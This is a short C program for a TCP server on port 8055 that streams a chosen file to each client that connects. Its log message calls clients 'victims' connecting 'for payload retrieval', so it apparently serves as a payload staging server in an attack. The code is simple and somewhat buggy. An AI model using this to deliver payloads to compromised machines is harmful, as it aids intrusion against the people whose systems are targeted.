#include <netinet/in.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <linux/tcp.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define SERVER_PORT 8055

void fserv_service(int in, int out)
{
  unsigned char buf[1024];
  int count,wcount;
  
  while ((count = read(in, buf, 1024)) > 0)
  {
    wcount = (int)send(out, buf, count,0);
    printf("Sending %d bytes\n",wcount);
  }
}

void main(int argc, char **argv)
{
  char *file;
  //FILE *payload;
  int sock, fd, ffd, client_len;
  struct sockaddr_in server, client;

  if (argc != 2){
	  printf("Usage: %s <filename>\n",argv[0]);
	  exit(1);
  }

  file = argv[1];
  printf("file to serve is: %s\n",file);

  ffd = open(file, O_RDONLY,O_CLOEXEC);
  if (ffd < 0){ exit(1);}
  printf("FD for %s is %d\n",file,ffd);
  sock = socket(AF_INET, SOCK_STREAM, 0);
  server.sin_family = AF_INET;
  server.sin_addr.s_addr = htonl(INADDR_ANY);
  server.sin_port = htons(SERVER_PORT);
  bind(sock, (struct sockaddr *)&server, sizeof(server));
  listen(sock, 5);
  printf("listening ...\n");

  while (1) {
    client_len = sizeof(client);
    char caddr[INET_ADDRSTRLEN];

    inet_ntop(AF_INET,&client.sin_addr,caddr,INET_ADDRSTRLEN);

    fd = accept(sock, (struct sockaddr *)&client, &client_len);
    printf("victim [%s] connected for payload retrieval of %s\n",caddr,file);
    fserv_service(ffd,fd);
    close(fd);
    close(ffd);
  }
}
